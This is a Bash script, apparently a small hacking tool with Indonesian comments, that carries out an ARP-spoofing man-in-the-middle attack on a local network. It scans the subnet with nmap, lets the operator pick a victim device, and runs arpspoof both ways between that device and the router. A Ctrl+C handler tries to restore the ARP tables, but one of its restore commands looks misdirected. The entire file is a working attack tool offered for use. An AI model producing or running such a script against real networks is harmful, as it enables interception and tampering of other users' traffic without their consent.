#!/bin/bash
clear

echo "

░██╗░░░░░░░██╗██╗░░░░░░███████╗██╗  ██╗░░██╗
░██║░░██╗░░██║██║░░░░░░██╔════╝██║  ╚██╗██╔╝ Simple Wi-Fi Attack
░╚██╗████╗██╔╝██║█████╗█████╗░░██║  ░╚███╔╝░ @VesperaIX
░░████╔═████║░██║╚════╝██╔══╝░░██║  ░██╔██╗░
░░╚██╔╝░╚██╔╝░██║░░░░░░██║░░░░░██║  ██╔╝╚██╗
░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝  ╚═╝░░╚═╝

"

function cleanup() {
    echo "[*] Memulihkan tabel ARP dan menghentikan serangan..."
    pkill arpspoof

    arping -c 4 -s "$gateway_ip" -S "$gateway_mac" -t "$attacker_mac" "$attacker_ip"
    arping -c 4 -s "$target_ip" -S "$target_mac" -t "$gateway_mac" "$gateway_ip"

    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo "[*] Serangan dihentikan dan jaringan dipulihkan!"
    exit 0
}

# Deteksi interface yang terhubung
network_interface=$(ip -o link show | awk -F': ' '{print $2}' | grep -Ev 'lo|docker' | head -n 1)

if [ -z "$network_interface" ]; then
    echo "[!] Tidak ada interface jaringan yang terhubung. Silakan pastikan Anda terhubung ke jaringan."
    exit 1
fi

echo "[*] Deteksi interface yang digunakan: $network_interface"

# Mengaktifkan IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Dapatkan IP gateway (router)
gateway_ip=$(ip route | grep default | awk '{print $3}')
if [ -z "$gateway_ip" ]; then
    echo "[!] Tidak dapat menemukan IP gateway. Periksa koneksi jaringan Anda."
    exit 1
fi
echo "[*] Gateway IP ditemukan: $gateway_ip"

# Pindai jaringan untuk mendapatkan daftar perangkat yang terhubung
echo "[*] Memindai jaringan untuk menemukan target..."
mapfile -t devices < <(nmap -sn "${gateway_ip%.*}.0/24" | grep "Nmap scan report for" | awk '{print $5}' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
devices=("${devices[@]/$gateway_ip}")  # Hapus IP gateway dari daftar

if [ ${#devices[@]} -eq 0 ]; then
    echo "[!] Tidak ada perangkat lain yang ditemukan di jaringan."
    exit 1
fi

# Menampilkan daftar target yang ditemukan
echo "[*] Daftar perangkat yang ditemukan:"
for i in "${!devices[@]}"; do
    echo "$((i + 1)). ${devices[i]}"
done

# Meminta pengguna untuk memilih target
read -p "Pilih nomor target yang ingin diserang: " target_choice
target_ip=${devices[$((target_choice - 1))]}

# Dapatkan MAC address untuk target dan gateway
target_mac=$(arp-scan --interface="$network_interface" "$target_ip" 2>/dev/null | grep "$target_ip" | awk '{print $2}')
gateway_mac=$(arp-scan --interface="$network_interface" "$gateway_ip" 2>/dev/null | grep "$gateway_ip" | awk '{print $2}')

# Dapatkan IP dan MAC address penyerang (attacker)
attacker_ip=$(ifconfig "$network_interface" | grep 'inet ' | awk '{print $2}')
attacker_mac=$(ifconfig "$network_interface" | grep ether | awk '{print $2}')

# Cek apakah IP dan MAC address ditemukan
if [ -z "$target_mac" ] || [ -z "$gateway_mac" ]; then
    echo "[!] Gagal mendapatkan MAC address. Pastikan IP yang dimasukkan benar."
    exit 1
fi

echo "[*] Memulai ARP spoofing..."
echo "Target IP: $target_ip (MAC: $target_mac)"
echo "Gateway IP: $gateway_ip (MAC: $gateway_mac)"
echo "Penyerang (Attacker) IP: $attacker_ip (MAC: $attacker_mac)"

# Trap untuk menangani Ctrl+C dan memulihkan tabel ARP
trap cleanup INT

# Jalankan arpspoof untuk menargetkan target dan gateway
arpspoof -i "$network_interface" -t "$target_ip" "$gateway_ip" &
arpspoof -i "$network_interface" -t "$gateway_ip" "$target_ip" &

# Menunggu sampai pengguna menekan Ctrl+C
wait
